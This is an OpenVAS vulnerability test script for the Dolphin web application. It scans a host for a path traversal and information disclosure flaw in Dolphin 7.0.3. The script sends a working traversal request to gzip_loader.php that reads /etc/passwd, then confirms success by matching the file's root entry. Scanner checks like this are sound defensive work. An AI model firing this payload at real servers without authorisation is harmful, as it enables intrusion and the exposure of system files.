###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dolphin_44620.nasl 5306 2017-02-16 09:00:16Z teissa $
#
# Dolphin SQL Injection and Information Disclosure Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Dolphin is prone to an SQL-injection vulnerability and an information-
disclosure vulnerability.

Exploiting these issues could allow an attacker to obtain sensitive
information, compromise the application, access or modify data, or
exploit latent vulnerabilities in the underlying database.

Dolphin 7.0.3 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100893);
 script_version("$Revision: 5306 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-11-05 13:21:25 +0100 (Fri, 05 Nov 2010)");
 script_bugtraq_id(44620);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Dolphin SQL Injection and Information Disclosure Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44620");
 script_xref(name : "URL" , value : "http://www.boonex.com");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/dolphin",cgi_dirs());

foreach dir (dirs) {

  req = string("GET ",dir,"/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\r\n");
  req = string(req, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; OpenVAS)\r\n");
  req = string(req, "Host: ",get_host_name(),"\r\n");
  req = string(req, "Accept-Encoding: None\r\n\r\n\r\n");

  soc = http_open_socket(port);
  if(!soc)exit(0);

  send(socket:soc, data:req);
  r = recv(socket: soc, length: 2048);
  http_close_socket(soc);

  if(egrep(pattern:"root:.*:0:[01]:",string:r)) {
    security_message(port:port); 
    exit(0);
  }  

}

exit(0);
